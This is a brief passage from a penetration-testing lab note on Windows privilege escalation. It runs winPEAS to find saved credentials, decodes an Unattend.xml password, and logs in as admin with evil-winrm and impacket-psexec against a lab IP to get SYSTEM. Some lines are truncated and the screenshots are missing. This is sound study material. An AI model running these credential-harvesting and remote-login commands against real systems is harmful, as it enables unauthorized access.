Enumerating saved creds:
```
.\winPEASany.exe windowscreds
.\winPEASany.exe filesinfo
```

In first command, didn't find much interesting. Just the hash of our current user, not very helpful for privesc.

In filesinfo however, we found this:
and this: (base64 encoded password string for presumably the admin user in the Unattend.xml file)

This might prove very useful. Perhaps get a session with rdp, winrm, or psexec etc. 
```
evil-
 -i 10.10.227.97 -u admin -p password123
```

impacket-psexec admin:'password123'@10.10.227.97 

As you can see ps-exec is preferable if you can use it as it grants you nt autority/system privileges if can access

![unnamed_0788a239680445ce9e7ccbbe498e8170](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Password%20Attacks/Passwords%20-%20Registry/{{notename}}-202605011742.png)
![unnamed_9780bdafc33d4ca89ae08e63603e3f91](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Password%20Attacks/Passwords%20-%20Registry/{{notename}}-202605011742-1.png)
![unnamed_f3b8da8f2ace4c99acc4294aabbe260e](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Password%20Attacks/Passwords%20-%20Registry/{{notename}}-202605011743.png)
![unnamed_c79e58c02a1e4ea9841cbd81116e069d](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Password%20Attacks/Passwords%20-%20Registry/{{notename}}-202605011743-1.png)